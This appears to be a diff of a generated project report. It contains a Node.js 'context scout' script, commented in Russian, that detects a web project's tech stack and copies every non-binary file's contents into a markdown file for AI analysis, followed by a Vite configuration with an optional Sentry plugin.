+    features: []
+  };
+  
+  const files = fs.readdirSync('.');
+  
+  // Фреймворки
+  if (files.includes('next.config.js')) stack.framework = 'Next.js';
+  else if (files.includes('nuxt.config.ts')) stack.framework = 'Nuxt.js';
+  else if (files.includes('angular.json')) stack.framework = 'Angular';
+  else if (files.includes('vue.config.js')) stack.framework = 'Vue';
+  else if (files.includes('svelte.config.js')) stack.framework = 'Svelte';
+  else if (files.includes('remix.config.js')) stack.framework = 'Remix';
+  else if (files.includes('vite.config.js')) stack.framework = 'Vite + React';
+  
+  // Бандлеры
+  if (files.includes('webpack.config.js')) stack.bundler = 'Webpack';
+  else if (files.includes('vite.config.js')) stack.bundler = 'Vite';
+  else if (files.includes('rollup.config.js')) stack.bundler = 'Rollup';
+  
+  // Стилизация
+  if (files.includes('tailwind.config.js')) stack.styling = 'Tailwind';
+  if (files.includes('postcss.config.js')) stack.features.push('PostCSS');
+  if (files.includes('sass') || files.includes('scss')) stack.features.push('Sass');
+  
+  // Тестирование
+  if (files.includes('jest.config.js')) stack.testing = 'Jest';
+  if (files.includes('cypress.json')) stack.features.push('Cypress');
+  
+  return stack;
+}
+
+function scanEverything(dir, depth = 0) {
+  let result = '';
+  const indent = '  '.repeat(depth);
+  
+  try {
+    const files = fs.readdirSync(dir);
+    
+    for (const file of files) {
+      const fullPath = path.join(dir, file);
+      if (IGNORE_PATTERNS.includes(file)) continue;
+      
+      const stat = fs.statSync(fullPath);
+      
+      if (stat.isDirectory()) {
+        result += `${indent}📁 ${file}/\n`;
+        result += scanEverything(fullPath, depth + 1);
+      } else {
+        // Читаем ВСЕ файлы кроме бинарных
+        if (!file.match(/\.(jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot|mp4|mp3|pdf|zip|tar|gz)$/)) {
+          result += `${indent}📄 ${file}\n`;
+          try {
+            const content = fs.readFileSync(fullPath, 'utf8');
+            // Для очень больших файлов - ограничиваем длину
+            const displayContent = content.length > 50000 
+              ? content.substring(0, 50000) + `\n// ... [TRUNCATED: ${content.length} chars total]`
+              : content;
+              
+            result += `${indent}--- BEGIN ${file} ---\n`;
+            result += displayContent;
+            result += `\n${indent}--- END ${file} ---\n\n`;
+          } catch (err) {
+            result += `${indent}// Error reading: ${err.message}\n\n`;
+          }
+        } else {
+          result += `${indent}📄 ${file} (binary)\n`;
+        }
+      }
+    }
+  } catch (err) {
+    result += `${indent}// Error: ${err.message}\n`;
+  }
+  
+  return result;
+}
+
+// Собираем полную информацию
+const techStack = detectTechStack();
+const fullStructure = scanEverything('.');
+
+const context = `
+# PROJECT SCOUT REPORT
+Generated: ${new Date().toISOString()}
+
+## Detected Tech Stack
+- Framework: ${techStack.framework}
+- Bundler: ${techStack.bundler} 
+- Styling: ${techStack.styling}
+- Testing: ${techStack.testing}
+- Features: ${techStack.features.join(', ') || 'None detected'}
+
+## Complete Project Structure & Content
+${fullStructure}
+
+## Recommendations for Optimized Script:
+<!-- AI will analyze this and suggest specific optimizations -->
+`;
+
+fs.writeFileSync('PROJECT_SCOUT_REPORT.md', context);
+console.log('🔍 Scout report generated: PROJECT_SCOUT_REPORT.md');
+console.log('📊 Tech stack detected:', techStack);
+--- END universal-context-scout.mjs ---
+
+📄 vite.config.js
+--- BEGIN vite.config.js ---
+import { defineConfig } from "vite";
+import viteReact from "@vitejs/plugin-react";
+import tailwindcss from "@tailwindcss/vite";
+import { sentryVitePlugin } from "@sentry/vite-plugin";
+
+import { TanStackRouterVite } from "@tanstack/router-plugin/vite";
+
+const basePlugins = [
+  TanStackRouterVite({ autoCodeSplitting: true }), 
+  viteReact(), 
+  tailwindcss(),
+];
+
+// Add Sentry plugin only if auth token is available
+if (process.env.SENTRY_AUTH_TOKEN) {
+  basePlugins.push(
+    sentryVitePlugin({
+      org: "org-name",
+      project: "project-name",
+      authToken: process.env.SENTRY_AUTH_TOKEN,
+    })
+  );
+}
+
+// https://vitejs.dev/config/
+export default defineConfig({
+  plugins: basePlugins,
+  build: {
+    // Only generate source maps if Sentry is enabled
+    sourcemap: !!process.env.SENTRY_AUTH_TOKEN,
+  },
+});
+
+--- END vite.config.js ---
 
 
 
-# Public Assets
-📄 favicon.ico (binary)
-📄 logo192.png (binary)
-📄 logo512.png (binary)
-📄 manifest.json
-// Файл manifest.json (содержимое пропущено для экономии места)
-
-📄 robots.txt (skipped)
-
+## Recommendations for Optimized Script:
+<!-- AI will analyze this and suggest specific optimizations -->
